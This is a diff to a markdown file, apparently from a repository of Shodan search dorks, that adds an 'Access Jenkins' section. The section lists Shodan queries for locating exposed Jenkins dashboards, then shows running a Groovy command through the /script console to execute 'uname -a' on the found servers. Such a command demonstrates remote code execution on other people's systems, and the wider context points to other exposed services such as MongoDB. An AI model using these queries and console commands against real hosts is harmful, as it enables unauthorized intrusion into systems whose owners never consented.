@@ -85,6 +85,19 @@ mongo --host 139.x.x.5
 ```
 ![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/69a9b077-8f19-4c3b-8032-0b6387c93c8b)
 
+## Access Jenkins
+
+```sh
+http.component:"jenkins"
+title:"Dashboard [Jenkins]"
+html:"Dashboard Jenkins"
+```
+```sh
+add /script 
+print "uname -a".execute().text
+```
+![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/1c8441b6-33ce-46a9-94b4-ad574866a63c)
+
 
 ## OS Windows Obsolete
 
